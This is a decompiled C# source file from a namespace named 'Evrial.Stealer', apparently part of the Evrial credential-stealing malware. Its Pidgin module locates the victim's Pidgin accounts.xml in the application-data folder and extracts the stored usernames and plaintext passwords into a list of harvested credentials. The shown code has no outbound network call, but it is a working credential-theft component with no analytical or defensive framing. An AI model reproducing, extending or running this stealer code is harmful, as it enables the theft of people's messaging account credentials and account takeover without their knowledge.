using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml;

namespace Evrial.Stealer
{
	// Token: 0x02000010 RID: 16
	internal static class Messenger
	{
		// Token: 0x02000011 RID: 17
		internal static class Pidgin
		{
			// Token: 0x0600001F RID: 31 RVA: 0x00002B24 File Offset: 0x00000D24
			public static List<PassData> Initialise()
			{
				List<PassData> result;
				try
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
					if (!File.Exists(text))
					{
						result = null;
					}
					else
					{
						XmlTextReader reader = new XmlTextReader(text);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(reader);
						List<PassData> list = (from XmlNode objXmlNode in xmlDocument.DocumentElement.ChildNodes
						select objXmlNode.ChildNodes into InnerList
						let Protocol = InnerList[0].InnerText
						let Username = InnerList[1].InnerText
						let Password = InnerList[2].InnerText
						select new PassData
						{
							Program = "Pidgin",
							Url = "Jabber",
							Login = Username,
							Password = Password
						}).ToList<PassData>();
						result = list;
					}
				}
				catch (Exception arg)
				{
					Console.WriteLine("Pidgin : " + arg);
					result = new List<PassData>();
				}
				return result;
			}
		}
	}
}
